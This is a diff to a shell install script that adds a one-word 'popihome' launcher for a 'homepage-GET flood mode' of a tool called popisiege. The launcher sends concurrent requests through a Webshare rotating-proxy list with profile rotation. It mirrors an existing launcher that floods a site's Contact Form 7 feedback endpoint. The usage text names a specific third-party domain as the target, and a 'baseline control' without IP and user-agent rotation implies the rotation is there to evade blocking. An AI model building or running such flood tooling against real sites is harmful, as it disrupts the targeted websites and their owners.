@@ -13,6 +13,7 @@ BIN_WATCH="/usr/local/bin/popiwatch"
 BIN_CF="/usr/local/bin/popicf"
 BIN_T1="/usr/local/bin/popitest1"
 BIN_SYN="/usr/local/bin/syntest"
+BIN_HOME="/usr/local/bin/popihome"
 BACKBONE_CREDS="$INSTALL_DIR/proxies_webshare_backbone_creds.txt"
 
 echo ""
@@ -98,6 +99,21 @@ sudo python3 /opt/popisiege/syntest.py "\$@"
 EOF
 chmod +x "$BIN_SYN"
 
+# popihome — one-word launcher for homepage-GET flood mode: same Webshare
+# backbone connection, concurrency, and profile rotation as popicf, but hits
+# the domain's homepage instead of POSTing to the CF7 feedback endpoint.
+cat > "$BIN_HOME" << EOF
+#!/usr/bin/env bash
+CREDS="$BACKBONE_CREDS"
+if [ ! -s "\$CREDS" ]; then
+    echo "Missing or empty \$CREDS"
+    echo "Create it once with your Webshare backbone list (p.webshare.io:80:user-N:pass per line), then rerun."
+    exit 1
+fi
+sudo python3 /opt/popisiege/popisiege.py --concurrency 19 --verbose --proxy-file "\$CREDS" --homepage "\$@"
+EOF
+chmod +x "$BIN_HOME"
+
 echo ""
 echo "=============================="
 echo "  Done."
@@ -127,6 +143,12 @@ echo "  Webshare backbone connection, one-word launcher:"
 echo "    popicf"
 echo "    (needs $BACKBONE_CREDS to exist first — create it once from your"
 echo "     Webshare backbone proxy list export, gitignored, never committed)"
+echo ""
+echo "  Homepage GET flood (same backbone/concurrency as popicf, GET / instead"
+echo "  of POST to CF7 feedback):"
+echo "    popihome"
+echo "    popihome --target metoo-buffalo.com"
+echo "    (needs $BACKBONE_CREDS, same as popicf)"
 echo ""
 echo "  Baseline control — no IP rotation, no UA rotation:"
 echo "    popitest1"
